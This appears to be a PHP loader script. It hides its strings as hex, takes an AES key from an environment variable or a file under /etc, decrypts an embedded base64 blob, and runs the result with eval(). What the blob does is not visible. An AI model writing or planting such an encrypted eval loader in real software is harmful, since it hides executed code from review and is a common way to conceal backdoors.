<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('2eXFoSA8xIAkX0LJvfsI7g==');

$c=base64_decode(

'ZQoP2MxMlKG5SrcQyoiYGfOJ+13tQkbbJP5Kf/CmsBeKrubQN8cFEe3qTBqcf6J/sO8PQKAgyInO' .
'9Rik3tADIkUo0Xar4k6vEv1ALchUEb6LR2vCHs01aWpbg/3SzzZ7DNkJrOm970h6BB0DTuE+utxM' .
'e5FnFfOVwE7m2/Rt3fc68vn0vlYKNDBF1cwWxeK6vR1l5j0OGRwBb1yUlqkjvA9O5fxBS0k5WnDe' .
'A0OPFGLpQk1W0GD4XC+x/kTOyRuN4vhkzEFdOnZtn6RpvufRkAEO5q4HMZ1q2ZY7VSvJtOLIlOlt' .
'xcpXAzPDeq1f6BwpJ069i6kLpr7M/mV7lTCm5fu7Ikpx984AyPw6KNlJTFNZDkP2b5jm+e4KDgUn' .
'k7cQnMQlKrMXqGf4wE09J63qbVs201SJgjUT2hM7NnwQv5LAOVER+n+NTfJrHqFQYBhbzcELOTXj' .
'UmYH8BAYj5LrpG8mdP9xACPeeq+f7vOOUJpmrCXlIQkRFrX46b+ne6bIOcmUomss3GdZe6I2Dyn+' .
'XgFB5nlNnMvjubvmBEJVNRs='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

